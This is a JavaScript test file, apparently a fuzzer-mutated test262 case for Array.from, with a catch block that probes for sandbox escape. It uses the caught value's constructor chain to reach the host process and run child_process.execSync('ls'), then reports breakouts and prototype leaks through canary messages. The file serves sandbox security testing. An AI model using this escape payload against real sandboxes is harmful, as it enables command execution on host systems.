try {
    var thisVals = [];
    var nextResult = {
        done: false,
        value: {}
    };
    var nextNextResult = {
        done: false,
        value: {}
    };
    var mapFn = function () {
        let REPLACER = 23;
        thisVals.push(this);
    };
    var items = {};
    var thisVal = {};
    items[Symbol.iterator] = function () {
        throw () => {
            return () => {
            };
        };
        return {
            next: function () {
                var result = nextResult;
                nextResult = nextNextResult;
                nextNextResult = { done: true };
                return result;
            }
        };
    };
    Array.from(items, mapFn, thisVal);
    assert.sameValue(thisVals.length, 2);
    assert.sameValue(thisVals[0], thisVal, 'First iteration `this` value');
    assert.sameValue(thisVals[1], thisVal, 'Second iteration `this` value');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}